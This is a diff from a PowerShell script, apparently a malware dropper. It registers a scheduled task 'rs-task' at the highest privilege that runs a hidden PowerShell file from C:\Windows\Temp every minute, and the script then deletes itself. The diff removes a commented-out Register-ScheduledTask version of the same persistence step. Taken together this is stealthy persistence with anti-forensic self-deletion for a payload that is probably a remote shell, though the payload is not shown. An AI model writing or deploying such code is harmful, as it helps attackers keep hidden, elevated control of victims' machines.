@@ -12,19 +12,6 @@ if($taskExists) {
 } else {
    Write-Output "Creating task...";
    C:\Windows\System32\schtasks.exe /create /tn rs-task /RL HIGHEST /tr "powershell -NoLogo -WindowStyle hidden -file C:\Windows\Temp\rs_sl.ps1" /sc minute /mo 1 /ru (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -expand UserName)
-   #$action = New-ScheduledTaskAction -Execute "rs_sl.ps1" -WorkingDirectory "C:\Windows\Temp";
-   #$trigger = New-ScheduledTaskTrigger -AtLogOn;
-   #$principal = New-ScheduledTaskPrincipal -UserId (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -expand UserName);
-   #$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal;
-   #Register-ScheduledTask rs-task -InputObject $task;
-   #$post_task = Get-ScheduledTask -TaskName "rs-task";
-   #$post_task.Triggers.repetition.Interval = 'PT1M'
-   #$post_task | Set-ScheduledTask
-   #$post_trigger.Triggers.Repetition.Interval = "PT1M";
-   #$post_trigger Set-ScheduledTask -TaskPath "C:\Windows\Temp\");
-   #Start-ScheduledTask -TaskName rs-task;
-   #note so my dumbass doesnt forget how to get rid of scheduled task in powershell.
-   #Unregister-ScheduledTask -TaskName rs-task -Confirm:$false
 }
 
 Remove-Item $script:MyInvocation.MyCommand.Path -Force;
